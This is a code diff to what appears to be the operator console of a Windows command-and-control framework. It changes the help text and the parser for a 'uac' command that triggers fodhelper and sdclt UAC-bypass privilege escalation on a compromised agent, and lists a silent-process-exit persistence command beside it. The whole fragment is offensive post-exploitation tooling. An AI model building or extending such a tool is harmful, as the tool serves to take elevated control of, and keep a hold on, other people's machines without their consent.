@@ -224,8 +224,8 @@ def print_agent_help(os):
     persist spe <command> <process-name>   ->  persist using silent process exit technique (elevation required)
     
     --== Privesc Stuff ==--
-    uac fodhelper <command> <keep/die>     ->  elevate session using the fodhelper uac bypass technique
-    uac sdclt <command> <keep/die>         ->  elevate session using the sdclt uac bypass technique
+    uac fodhelper <command>                ->  elevate session using the fodhelper uac bypass technique
+    uac sdclt <command>                    ->  elevate session using the sdclt uac bypass technique
     
     --== Interaction stuff ==--
     msgbox <title> <text>                  ->  pop a message box in a new thread
@@ -448,16 +448,14 @@ def agent_screen_windows(agent_id):
                 else:  # should not get here
                     continue
 
-            elif re.fullmatch(r"\s*uac\s+(fodhelper|sdclt)\s+.*\s+(keep|die)\s*", command):
+            elif re.fullmatch(r"\s*uac\s+(fodhelper|sdclt)\s+.*\s*", command):
                 args = shlex.split(re.sub(r"\s*uac\s+", "", command, 1))
                 bypass_method = args[0]
                 elevated_command = args[1]
-                keep_or_die = args[2]
                 command_dict = {
                     "command_type": "uac-bypass",
                     "bypass_method": bypass_method,
-                    "elevated_command": elevated_command,
-                    "keep_or_die": keep_or_die
+                    "elevated_command": elevated_command
                 }
 
             elif re.fullmatch(r"\s*msgbox .+", command):
